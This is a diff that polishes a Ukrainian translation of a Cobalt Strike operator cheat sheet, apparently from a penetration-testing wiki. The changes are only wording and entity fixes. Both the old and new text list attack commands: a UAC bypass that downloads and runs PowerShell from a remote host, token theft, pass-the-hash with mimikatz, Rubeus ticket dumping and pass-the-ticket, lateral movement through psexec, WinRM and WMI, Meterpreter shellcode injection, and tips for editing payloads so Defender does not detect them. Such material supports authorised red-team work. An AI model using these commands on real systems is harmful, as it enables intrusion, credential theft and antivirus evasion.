@@ -8,7 +8,7 @@
 
 ### Peer2Peer Listeners
 
-Маяки цих слухачів не повинні спілкуватися з C2 безпосередньо, вони можуть спілкуватися з ним через інші маяки.
+Маяки цих слухачів не повинні спілкуватися з C2 безпосередньо, вони можуть зв'язуватися з ним через інші маяки.
 
 `Cobalt Strike -> Listeners -> Add/Edit`, потім вам потрібно вибрати TCP або SMB маяки.
 
@@ -19,7 +19,7 @@
 
 #### Generate payloads in files
 
-`Attacks -> Packages ->`&#x20;
+`Attacks -> Packages ->`
 
 * **`HTMLApplication`** для HTA файлів
 * **`MS Office Macro`** для офісного документа з макросом
@@ -37,7 +37,7 @@
 ### Beacon Options
 
 <pre class="language-bash"><code class="lang-bash"># Виконати локальний .NET бінарний файл
-execute-assembly &#x3C;/path/to/executable.exe>
+execute-assembly </path/to/executable.exe>
 
 # Скриншоти
 printscreen    # Зробити один скриншот за допомогою методу PrintScr
@@ -56,26 +56,26 @@ portscan [targets] [ports] [arp|icmp|none] [max connections]
 # Powershell
 # Імпортувати модуль Powershell
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;просто напишіть команду powershell тут>
+powershell <просто напишіть команду powershell тут>
 
 # Імітація користувача
 ## Генерація токена з обліковими даними
 make_token [DOMAIN\user] [password] #Створити токен для імітації користувача в мережі
 ls \\computer_name\c$ # Спробуйте використовувати згенерований токен для доступу до C$ на комп'ютері
-rev2self # Припинити використовувати токен, згенерований за допомогою make_token
+rev2self # Припинити використання токена, згенерованого за допомогою make_token
 ## Використання make_token генерує подію 4624: Обліковий запис успішно ввійшов. Ця подія дуже поширена в домені Windows, але може бути звужена шляхом фільтрації за типом входу. Як згадувалося вище, вона використовує LOGON32_LOGON_NEW_CREDENTIALS, який є типом 9.
 
 # UAC Bypass
-elevate svc-exe &#x3C;listener>
-elevate uac-token-duplication &#x3C;listener>
+elevate svc-exe <listener>
+elevate uac-token-duplication <listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
 ## Вкрасти токен з pid
 ## Як make_token, але вкрасти токен з процесу
 steal_token [pid] # Також це корисно для мережевих дій, а не локальних дій
-## З документації API ми знаємо, що цей тип входу "дозволяє виклику клонувати свій поточний токен". Ось чому вихід Beacon говорить Impersonated &#x3C;current_username> - він імітує наш власний клонований токен.
+## З документації API ми знаємо, що цей тип входу "дозволяє виклику клонувати свій поточний токен". Ось чому вивід Beacon говорить Імітований <current_username> - він імітує наш власний клонований токен.
 ls \\computer_name\c$ # Спробуйте використовувати згенерований токен для доступу до C$ на комп'ютері
-rev2self # Припинити використовувати токен з steal_token
+rev2self # Припинити використання токена з steal_token
 
 ## Запустити процес з новими обліковими даними
 spawnas [domain\username] [password] [listener] #Зробіть це з каталогу з правами на читання, наприклад: cd C:\
@@ -83,54 +83,54 @@ spawnas [domain\username] [password] [listener] #Зробіть це з ката
 
 ## Впровадити в процес
 inject [pid] [x64|x86] [listener]
-## З точки зору OpSec: Не виконуйте крос-платформенне впровадження, якщо це дійсно не потрібно (наприклад, x86 -> x64 або x64 -> x86).
+## З точки зору OpSec: Не виконуйте крос-платформенне впровадження, якщо ви дійсно не повинні (наприклад, x86 -> x64 або x64 -> x86).
 
 ## Pass the hash
-## Цей процес модифікації вимагає патчування пам'яті LSASS, що є високоризиковою дією, вимагає локальних адміністративних привілеїв і не є дуже життєздатним, якщо увімкнено Protected Process Light (PPL).
+## Цей процес модифікації вимагає патчування пам'яті LSASS, що є високоризиковою дією, вимагає локальних прав адміністратора і не є дуже життєздатним, якщо увімкнено Protected Process Light (PPL).
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash через mimikatz
-mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
+mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
 ## Без /run, mimikatz запускає cmd.exe, якщо ви працюєте як користувач з робочим столом, він побачить оболонку (якщо ви працюєте як SYSTEM, ви в порядку)
-steal_token &#x3C;pid> #Вкрасти токен з процесу, створеного mimikatz
+steal_token <pid> #Вкрасти токен з процесу, створеного mimikatz
 
 ## Pass the ticket
 ## Запросити квиток
-execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
+execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Створити нову сесію входу для використання з новим квитком (щоб не перезаписувати скомпрометований)
-make_token &#x3C;domain>\&#x3C;username> DummyPass
-## Записати квиток на машину атакуючого з сеансу poweshell &#x26; завантажити його
+make_token <domain>\<username> DummyPass
+## Записати квиток на машині атакуючого з сеансу poweshell та завантажити його
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
 ## Pass the ticket з SYSTEM
 ## Згенерувати новий процес з квитком
-execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
 ## Вкрасти токен з цього процесу
-steal_token &#x3C;pid>
+steal_token <pid>
 
 ## Extract ticket + Pass the ticket
 ### Список квитків
 execute-assembly C:\path\Rubeus.exe triage
 ### Вивантажити цікавий квиток за luid
-execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
-### Створити нову сесію входу, зверніть увагу на luid та processid
+execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
+### Створити нову сесію входу, зафіксувати luid та processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 ### Вставити квиток у згенеровану сесію входу
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
 ### Нарешті, вкрасти токен з цього нового процесу
-steal_token &#x3C;pid>
+steal_token <pid>
 
 # Lateral Movement
 ## Якщо токен був створений, він буде використаний
 jump [method] [target] [listener]
 ## Методи:
-## psexec                    x86   Використовуйте службу для запуску артефакту Service EXE
-## psexec64                  x64   Використовуйте службу для запуску артефакту Service EXE
-## psexec_psh                x86   Використовуйте службу для запуску однолінійного скрипту PowerShell
-## winrm                     x86   Запустіть скрипт PowerShell через WinRM
-## winrm64                   x64   Запустіть скрипт PowerShell через WinRM
+## psexec                    x86   Використати службу для запуску артефакту Service EXE
+## psexec64                  x64   Використати службу для запуску артефакту Service EXE
+## psexec_psh                x86   Використати службу для запуску однорядного скрипту PowerShell
+## winrm                     x86   Запустити скрипт PowerShell через WinRM
+## winrm64                   x64   Запустити скрипт PowerShell через WinRM
 
 remote-exec [method] [target] [command]
 ## Методи:
@@ -138,12 +138,12 @@ remote-exec [method] [target] [command]
 </strong>## winrm                           Віддалене виконання через WinRM (PowerShell)
 ## wmi                             Віддалене виконання через WMI
 
-## Щоб виконати маяк за допомогою wmi (це не в команді jump), просто завантажте маяк і виконайте його
+## Щоб виконати маяк з wmi (це не в команді jump), просто завантажте маяк і виконайте його
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
 
-# Pass session to Metasploit - Через слухача
+# Pass session to Metasploit - Through listener
 ## На хості metaploit
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
@@ -155,22 +155,22 @@ msf6 exploit(multi/handler) > exploit -j
 beacon> spawn metasploit
 ## Ви можете запускати лише x86 Meterpreter сесії з іноземного слухача.
 
-# Pass session to Metasploit - Через ін'єкцію shellcode
+# Pass session to Metasploit - Through shellcode injection
 ## На хості metasploit
-msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
 ## Запустіть msfvenom і підготуйте слухача multi/handler
 
 ## Скопіюйте бінарний файл на хост cobalt strike
 ps
-shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Ін'єктуйте shellcode metasploit у процес x64
+shinject <pid> x64 C:\Payloads\msf.bin #Впровадити shellcode metasploit у процес x64
 
 # Pass metasploit session to cobalt strike
 ## Згенеруйте stageless Beacon shellcode, перейдіть до Attacks > Packages > Windows Executable (S), виберіть бажаний слухач, виберіть Raw як тип виходу та виберіть Use x64 payload.
-## Використовуйте post/windows/manage/shellcode_inject у metasploit для ін'єкції згенерованого shellcode cobalt strike.
+## Використовуйте post/windows/manage/shellcode_inject у metasploit для впровадження згенерованого shellcode cobalt strike.
 
 
 # Pivoting
-## Відкрийте проксі-сервер socks на teamserver
+## Відкрити сокс-проксі на teamserver
 beacon> socks 1080
 
 # SSH connection
@@ -180,7 +180,7 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Artifact Kit
 
-Зазвичай у `/opt/cobaltstrike/artifact-kit` ви можете знайти код і попередньо скомпільовані шаблони (у `/src-common`) вантажів, які cobalt strike збирається використовувати для генерації бінарних маяків.
+Зазвичай у `/opt/cobaltstrike/artifact-kit` ви можете знайти код і попередньо скомпільовані шаблони (в `/src-common`) вантажів, які cobalt strike буде використовувати для генерації бінарних маяків.
 
 Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) з згенерованим бекдором (або просто з скомпільованим шаблоном), ви можете дізнатися, що викликає спрацьовування захисника. Це зазвичай рядок. Тому ви можете просто змінити код, який генерує бекдор, так що цей рядок не з'являється в фінальному бінарному файлі.
 
